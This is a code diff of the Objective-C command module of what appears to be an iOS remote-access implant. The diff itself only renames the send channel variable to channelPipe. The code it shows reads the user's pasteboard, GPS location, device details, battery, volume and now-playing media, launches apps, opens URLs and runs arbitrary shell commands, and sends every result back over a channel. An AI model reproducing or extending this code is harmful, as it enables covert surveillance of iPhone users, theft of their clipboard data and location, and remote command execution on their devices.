@@ -22,9 +22,6 @@
 * SOFTWARE.
 */
 
-#include "external/badges.h"
-#include "channel.h"
-
 #import "ios_commands.h"
 
 @implementation Commands
@@ -48,39 +45,39 @@
     NSString *sysinfo = [NSString stringWithFormat:@"%sModel: %@\n%sBattery: %d\n%sVersion: %@\n%sName: %@\n",
                         information, [device model], information, batinfo, information, [device systemVersion], information, [device name]];
 
-    send_channel(channel, [sysinfo UTF8String]);
+    send_channel(channelPipe, [sysinfo UTF8String]);
 }
 
 -(void)cmd_getpid {
     NSProcessInfo* processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    send_channel(channel, [[NSString stringWithFormat:@"%sPID: %d\n", information, processID] UTF8String]);
+    send_channel(channelPipe, [[NSString stringWithFormat:@"%sPID: %d\n", information, processID] UTF8String]);
 }
 
 -(void)cmd_getpaste {
     UIPasteboard* pb = [UIPasteboard generalPasteboard];
-    [channel sendChannel:channelPipe withData:@"Pasteboard:\n"];
+    send_channel(channelPipe, "Pasteboard:\n");
     if ([pb.strings count] > 1) {
         NSUInteger count = 0;
         for (NSString* pstring in pb.strings){
-            send_channel(channel, [[NSString stringWithFormat:@"%lu: %@\n", count, pstring] UTF8String]);
+            send_channel(channelPipe, [[NSString stringWithFormat:@"%lu: %@\n", count, pstring] UTF8String]);
             count++;
         }
     } else if ([pb.strings count] == 1)
-        send_channel(channel, [[NSString stringWithFormat:@"%@\n", [pb.strings firstObject]] UTF8String]);
+        send_channel(channelPipe, [[NSString stringWithFormat:@"%@\n", [pb.strings firstObject]] UTF8String]);
 }
 
 -(void)cmd_battery {
     int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
     NSString *info = [NSString stringWithFormat:@"%sBattery level: %d (%@charging)\n", information,
                       batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @"not "];
-    send_channel(channel, [info UTF8String]);
+    send_channel(channelPipe, [info UTF8String]);
 }
 
 -(void)cmd_getvol {
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-    send_channel(channel, [[NSString stringWithFormat:@"%sVolume level: %.2f\n", information,
+    send_channel(channelPipe, [[NSString stringWithFormat:@"%sVolume level: %.2f\n", information,
                             [AVAudioSession sharedInstance].outputVolume] UTF8String]);
 }
 
@@ -91,12 +88,12 @@
     CLLocationCoordinate2D coordinate = [location coordinate];
 
     if ((int)(coordinate.latitude + coordinate.longitude) == 0)
-        send_channel(channel, [[NSString stringWithFormat:@"%sUnable to get device location!\n", error] UTF8String]);
+        send_channel(channelPipe, [[NSString stringWithFormat:@"%sUnable to get device location!\n", error] UTF8String]);
     else {
         NSString *location = [NSString stringWithFormat:@"%sLatitude: %f\n%sLongitude: %f\n%sMap: http://maps.google.com/maps?q=%f,%f\n",
                              information, coordinate.latitude, information, coordinate.longitude,
                               information, coordinate.latitude, coordinate.longitude];
-        send_channel(channel, [location UTF8String]);
+        send_channel(channelPipe, [location UTF8String]);
     }
 }
 
@@ -113,7 +110,7 @@
         CFStringGetCString(CFArrayGetValueAtIndex(array, pointer), buffer, sizeof(buffer), kCFStringEncodingUTF8);
         result = [NSString stringWithFormat:@"%@%s\n", result, buffer];
     }
-    send_channel(channel, [result UTF8String]);
+    send_channel(channelPipe, [result UTF8String]);
 }
 
 -(void)cmd_exec:(NSString *)command {
@@ -126,7 +123,7 @@
     NSFileHandle *file = [pipe fileHandleForReading];
     [task launch];
     NSData *data = [file readDataToEndOfFile];
-    send_channel(channel, [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] UTF8String]);
+    send_channel(channelPipe, [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] UTF8String]);
 }
 
 -(void)cmd_say:(NSString *)message {
@@ -178,9 +175,9 @@
             NSString *artist = [song valueForProperty:MPMediaItemPropertyArtist];
             NSString *result = [NSString stringWithFormat:@"%sTitle: %@\n%sAlbum: %@\n%sArtist: %@\n%sPlayback time: %f\n",
                                 information, title, information, album, information, artist, information, playbackTime];
-            send_channel(channel, [result UTF8String]);
+            send_channel(channelPipe, [result UTF8String]);
         } else {
-            send_channel(channel, [[NSString stringWithFormat:@"%sNot playing.\n", warning] UTF8String]);
+            send_channel(channelPipe, [[NSString stringWithFormat:@"%sNot playing.\n", warning] UTF8String]);
         }
     }
 }
@@ -191,21 +188,21 @@
     assert(identifier != NULL);
     int status = SBSLaunchApplicationWithIdentifier(identifier, NO);
     if (status != 0) {
-        send_channel(channel, [[NSString stringWithFormat:@"%sFailed to open application!\n", error] UTF8String]);
+        send_channel(channelPipe, [[NSString stringWithFormat:@"%sFailed to open application!\n", error] UTF8String]);
     }
     CFRelease(identifier);
-    send_channel(channel, [[NSString stringWithFormat:@"%sApplication has been launched!\n", success] UTF8String]);
+    send_channel(channelPipe, [[NSString stringWithFormat:@"%sApplication has been launched!\n", success] UTF8String]);
 }
 
 -(void)cmd_openurl:(NSString *)url {
     CFURLRef status = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
     if (!status) {
-        send_channel(channel, [[NSString stringWithFormat:@"%sInvalid URL address given!\n", error] UTF8String]);
+        send_channel(channelPipe, [[NSString stringWithFormat:@"%sInvalid URL address given!\n", error] UTF8String]);
         return;
     } else {
         bool ret = SBSOpenSensitiveURLAndUnlock(status, 1);
         if (!ret) {
-            send_channel(channel, [[NSString stringWithFormat:@"%sFailed to open URL!\n", error] UTF8String]);
+            send_channel(channelPipe, [[NSString stringWithFormat:@"%sFailed to open URL!\n", error] UTF8String]);
             return;
         }
     }
@@ -222,14 +219,14 @@
         if (isdir)
             [fileManager changeCurrentDirectoryPath:path];
         else {
-            send_channel(channel, [[NSString stringWithFormat:@"%sPath: %@: Not a directory!\n", error, path] UTF8String]);
+            send_channel(channelPipe, [[NSString stringWithFormat:@"%sPath: %@: Not a directory!\n", error, path] UTF8String]);
             return;
         }
     } else {
-        send_channel(channel, [[NSString stringWithFormat:@"%sPath %@: No such file or directory!\n", error, path] UTF8String]);
+        send_channel(channelPipe, [[NSString stringWithFormat:@"%sPath %@: No such file or directory!\n", error, path] UTF8String]);
         return;
     }
-    send_channel(channel, [[NSString stringWithFormat:@"%sCurrent directory: %@", information, [fileManager currentDirectoryPath]] UTF8String]);
+    send_channel(channelPipe, [[NSString stringWithFormat:@"%sCurrent directory: %@", information, [fileManager currentDirectoryPath]] UTF8String]);
 }
 
 @end
